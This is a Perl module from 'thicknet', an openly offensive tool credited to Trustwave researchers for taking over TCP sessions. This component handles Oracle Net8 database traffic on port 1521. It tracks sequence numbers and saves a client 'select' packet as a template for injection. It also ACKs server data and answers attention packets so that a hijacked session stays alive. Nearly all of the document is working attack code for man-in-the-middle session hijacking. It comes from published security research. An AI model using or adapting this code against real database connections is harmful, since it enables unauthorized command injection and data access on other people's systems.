package thicknet::packet::Oracle;

=header
    thicknet - A tool to manipulate and take control of TCP sessions
	Created by Steve Ocepek and Wendel G. Henrique
	Copyright (C) 2010, 2011 Trustwave Holdings, Inc.
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
=cut

use lib '.';
use base thicknet::packet::Packet;

use Exporter;
use thicknet::pcap::ARP;
use thicknet::Util;
use thicknet::session::Session;

sub process {
    my $self = shift;
    my ($server,$client,$server_port,$client_port,$session);
    if ($self->{new}) {
        # New session
        # Figure out client / server
        # This will use 1521 as server
        if ($self->{tcp}->{src_port} == 1521) {
            $server = ip2hex($self->{ip}->{src_ip});
            $client = ip2hex($self->{ip}->{dest_ip});
            $server_port = $self->{tcp}->{src_port};
            $client_port = $self->{tcp}->{dest_port};
            $self->{dir} = 1; 
        }
        elsif ($self->{tcp}->{dest_port} == 1521) {
            $server = ip2hex($self->{ip}->{dest_ip});
            $client = ip2hex($self->{ip}->{src_ip});
            $server_port = $self->{tcp}->{dest_port};
            $client_port = $self->{tcp}->{src_port};
            $self->{dir} = 0;
        }
        # Create session object
        $self->{sref}->{"$client:$client_port:$server:$server_port"} = thicknet::session::Session->new();
        $self->{session} = $self->{sref}->{"$client:$client_port:$server:$server_port"};
        $self->{session}->{server} = $server;
        $self->{session}->{client} = $client;
        $self->{session}->{client_port} = $client_port;
        $self->{session}->{server_port} = $server_port;
        $self->{session}->{mymac} = $self->{mymac};
        $self->{session}->{pcaph} = $self->{pcaph};
        if ($self->{dir}) {
            $self->{session}->{client_seq} = $self->{tcp}->{seqnum};
            $self->{session}->{server_seq} = $self->{tcp}->{acknum};
        }
        else {
            $self->{session}->{server_seq} = $self->{tcp}->{seqnum};
            $self->{session}->{client_seq} = $self->{tcp}->{acknum};
        }   
    }
    
    my $data = $self->{tcp}->{data};
    
	# If sled isn't set yet, test packets till you find one
	# Only perform this check for client->server (dir == 1)
	my $sled_text = "select";
	unless ($self->{session}->{sled}) {
	    unless ($self->{dir}) {
		    if ($self->{tcp}->{data} =~ m/$sled_text/i) {
			    $self->{session}->{sled}->{pkt} = $self->{pkt};
			    $self->{session}->{sled}->{eth} = NetPacket::Ethernet->decode($self->{pkt});
			    $self->{session}->{sled}->{ip} = NetPacket::IP->decode($self->{eth}->{data});
			    $self->{session}->{sled}->{tcp} = NetPacket::TCP->decode($self->{ip}->{data});
		    }
	    }
    }
    
    # Respond to packet here
    # In this case, we just ACK data that's sent to us
    unless ($self->{dir}) {    
        if ($self->{session}->{block}) {
            # big boy TCP pants
            # Test for Oracle Net8 attn packet
            if ($self->{datalen} == 11) {
    		    if (ord (substr($self->{tcp}->{data}, 4, 1)) == 0x0c) {
    			    $self->{session}->attn(ord (substr($data, 10, 1)));
    		    }
    	    }
    	    # Otherwise just ack
    	    else {
    	        if ($self->{datalen} > 0) {
				    $self->{session}->ack();
			    }
    	    }
        }
    }
}

1;
    